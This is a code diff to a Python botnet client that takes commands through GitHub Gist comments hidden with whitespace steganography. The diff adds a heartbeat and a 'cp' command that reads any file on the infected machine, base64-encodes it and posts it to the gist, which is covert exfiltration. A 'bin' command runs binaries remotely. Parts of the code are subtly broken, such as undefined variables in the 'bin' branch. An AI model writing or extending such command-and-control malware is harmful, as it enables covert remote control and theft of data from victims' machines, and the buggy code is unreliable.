@@ -3,6 +3,7 @@ import requests
 import time
 import subprocess
 import pyUnicodeSteganography as STG
+import base64
 
 class Bot:
     def __init__(self, gist_id, token, url):
@@ -20,6 +21,9 @@ class Bot:
     def decode_message(self, message):
         dec_msg = STG.decode(message, method="snow")
         return dec_msg
+    
+    def send_heartbeat(self):
+        return self.post_message(self.encode_message("alive"))
 
     def check_for_updates(self):
         response = requests.get(self.url, headers=self.headers)
@@ -64,14 +68,14 @@ class Bot:
             self.post_message(str(output.stdout))
 
         if command == 'cp':
-            # Copy a file from the bot to the controller. The file name is specified
-            file_name = 'file.txt'
-            subprocess.run(['cp', file_name, '/path/to/destination'])
-            self.post_message(str(output.stdout))
+            with open(msg[1], 'rb') as f:
+                file = f.read()
+                file = base64.b64encode(file).decode('utf-8')
+                self.post_message(self.encode_message("file: " + file))
 
         if command == 'bin':
             # Execute a binary inside the bot given the name of the binary. Example: ‘/usr/bin/ps’
-            binary_name = '/usr/bin/ps'
+            binary_name = file_name
             subprocess.run([binary_name])
             self.post_message(str(output.stdout))
 
@@ -91,8 +95,10 @@ if __name__ == "__main__":
     url = f"https://api.github.com/gists/{GIST_ID}/comments"
 
     bot = Bot(GIST_ID, MY_TOKEN, url)
+    
     while True:
         print("bot - checking for updates...")
         bot.check_for_updates()
+        bot.send_heartbeat()
         time.sleep(10)
     
